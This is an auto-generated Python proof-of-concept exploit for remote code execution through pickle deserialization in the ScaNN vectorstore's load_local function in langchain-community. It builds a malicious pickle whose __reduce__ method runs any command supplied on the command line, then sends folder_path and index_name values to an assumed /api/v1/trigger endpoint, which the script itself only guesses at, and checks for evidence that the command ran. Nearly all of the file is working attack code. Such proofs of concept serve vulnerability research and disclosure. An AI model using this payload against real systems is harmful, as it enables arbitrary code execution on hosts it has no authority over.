#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-013
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: The load_local function in ScaNN vectorstore uses pickle.load()
on a file path constructed from user-controlled folder_path and index_name.
If allow_dangerous_deserialization is set to True (required for functionality),
an attacker can supply a malicious pickle file to achieve arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Triggering the vulnerable function with attacker-controlled paths
3. Verifying code execution

Usage:
    python3 poc.py [--target http://localhost:8000] [--payload-command "touch /tmp/poc_success.txt"]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
import urllib.request
import urllib.error
from pathlib import Path


# =============================================================================
# Step 1: Create a malicious pickle file
# =============================================================================

class MaliciousPickle:
    """
    A class that when pickled and then unpickled will execute arbitrary code.
    This uses the __reduce__ method which is called during unpickling.
    """
    def __reduce__(self):
        # Return a tuple (callable, args) - subprocess.check_output will be called
        # with the command list during unpickling
        return (subprocess.check_output, (self.command,))

    def __init__(self, command):
        self.command = command


def create_malicious_pickle(command, output_path):
    """
    Create a pickle file that will execute the given command when unpickled.
    
    Args:
        command: List of command arguments (e.g., ['touch', '/tmp/poc_success.txt'])
        output_path: Path where the pickle file will be written
    """
    # Create the malicious object
    payload = MaliciousPickle(command)
    
    # Pickle it to a file
    with open(output_path, 'wb') as f:
        pickle.dump(payload, f)
    
    print(f"[+] Created malicious pickle file at: {output_path}")
    print(f"[+] Payload command: {' '.join(command)}")


# =============================================================================
# Step 2: Trigger the vulnerability
# =============================================================================

def trigger_vulnerability(target_url, folder_path, index_name):
    """
    Send a request to the vulnerable endpoint with attacker-controlled parameters.
    
    The vulnerable function constructs the path as:
        path = Path(folder_path)
        pickle_path = path / "{index_name}.pkl"
        with open(pickle_path, "rb") as f:
            docstore, index_to_docstore_id = pickle.load(f)
    
    Args:
        target_url: Base URL of the vulnerable service
        folder_path: Path to the folder containing the pickle file
        index_name: Name of the index (used to construct the pickle filename)
    """
    # Construct the API endpoint URL
    # Assuming the vulnerable endpoint is at /api/v1/trigger
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"
    
    # The request body - adjust based on actual API structure
    # The vulnerable function is called with folder_path and index_name
    # In a real scenario, this would be the user input that gets passed to load_local
    data = {
        "folder_path": folder_path,
        "index_name": index_name,
        "allow_dangerous_deserialization": True  # Required for exploitation
    }
    
    # Convert to JSON and encode
    import json
    json_data = json.dumps(data).encode('utf-8')
    
    print(f"[*] Sending exploit request to: {endpoint}")
    print(f"[*] Payload: folder_path={folder_path}, index_name={index_name}")
    
    try:
        req = urllib.request.Request(
            endpoint,
            data=json_data,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            response_data = response.read().decode('utf-8')
            print(f"[+] Request sent successfully")
            print(f"[+] Response: {response_data[:200]}...")
            
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} - {e.reason}")
        print(f"[!] Response body: {e.read().decode('utf-8')[:200]}")
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e.reason}")
        print(f"[!] Make sure the target service is running")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


# =============================================================================
# Step 3: Verify code execution
# =============================================================================

def verify_execution(check_path):
    """
    Check if the payload command was executed by verifying the existence of
    a file or other indicator.
    
    Args:
        check_path: Path to check for evidence of execution
    """
    time.sleep(1)  # Give the server time to process
    
    if os.path.exists(check_path):
        print(f"[+] SUCCESS! Code execution confirmed - file exists: {check_path}")
        print(f"[+] File contents: {open(check_path).read()}")
        return True
    else:
        print(f"[-] No evidence of code execution at: {check_path}")
        print("[-] The target may not be vulnerable or the payload may not have executed")
        return False


# =============================================================================
# Main exploit function
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only RCE via pickle deserialization"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL of the vulnerable service (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--payload-command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute on the target (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify-path",
        default="/tmp/poc_success.txt",
        help="Path to check for execution evidence (default: /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--local-test",
        action="store_true",
        help="Run a local test without a remote server (demonstrates the vulnerability directly)"
    )
    
    args = parser.parse_args()
    
    # Parse the command
    command_parts = args.payload_command.split()
    
    if args.local_test:
        # Local test mode - demonstrates the vulnerability directly
        print("[*] Running local test to demonstrate the vulnerability...")
        
        # Create a temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create the malicious pickle file
            pickle_path = os.path.join(tmpdir, "exploit.pkl")
            create_malicious_pickle(command_parts, pickle_path)
            
            # Now simulate what the vulnerable function does
            print("\n[*] Simulating vulnerable load_local function...")
            print(f"[*] Loading pickle from: {pickle_path}")
            
            try:
                # This is exactly what the vulnerable code does:
                # with open(path / "{index_name}.pkl", "rb") as f:
                #     docstore, index_to_docstore_id = pickle.load(f)
                with open(pickle_path, "rb") as f:
                    result = pickle.load(f)
                print(f"[+] Pickle loaded successfully, result: {result}")
            except Exception as e:
                print(f"[!] Error during unpickling: {e}")
            
            # Verify execution
            verify_execution(args.verify_path)
            
    else:
        # Remote exploitation mode
        print("[*] Starting remote exploitation...")
        
        # Create a temporary directory for the malicious pickle
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create the malicious pickle file
            # The vulnerable function expects the file to be named {index_name}.pkl
            # So we create it with a specific name
            index_name = "exploit"
            pickle_filename = f"{index_name}.pkl"
            pickle_path = os.path.join(tmpdir, pickle_filename)
            
            create_malicious_pickle(command_parts, pickle_path)
            
            # In a real scenario, the attacker would need to:
            # 1. Host this pickle file somewhere accessible to the target
            # 2. Or use path traversal to point to an existing file
            # 
            # For this PoC, we assume the attacker can write files to the target
            # or the target has a file upload feature that places files in a known location
            #
            # The folder_path would point to the directory containing the pickle file
            # The index_name would be "exploit" to match the filename "exploit.pkl"
            
            print(f"\n[*] To exploit remotely, you would need to:")
            print(f"    1. Upload {pickle_path} to the target server")
            print(f"    2. Call the vulnerable endpoint with:")
            print(f"       folder_path = <path to directory containing the pickle>")
            print(f"       index_name = {index_name}")
            print(f"       allow_dangerous_deserialization = True")
            
            # Attempt to trigger the vulnerability
            print(f"\n[*] Attempting to trigger vulnerability on {args.target}...")
            trigger_vulnerability(
                args.target,
                tmpdir,  # In real scenario, this would be a path on the target
                index_name
            )
            
            # Note: In a real exploit, the attacker would need to know the
            # server-side path where the pickle file is stored. This PoC
            # demonstrates the concept but may need adjustment for the actual
            # target environment.


if __name__ == "__main__":
    print("=" * 60)
    print("langchain-community-only RCE Proof-of-Concept")
    print("=" * 60)
    print()
    print("[*] Vulnerability: pickle.load() on user-controlled path")
    print("[*] The load_local function in ScaNN vectorstore")
    print("[*] constructs a file path from folder_path and index_name")
    print("[*] and calls pickle.load() without validation")
    print()
    
    main()
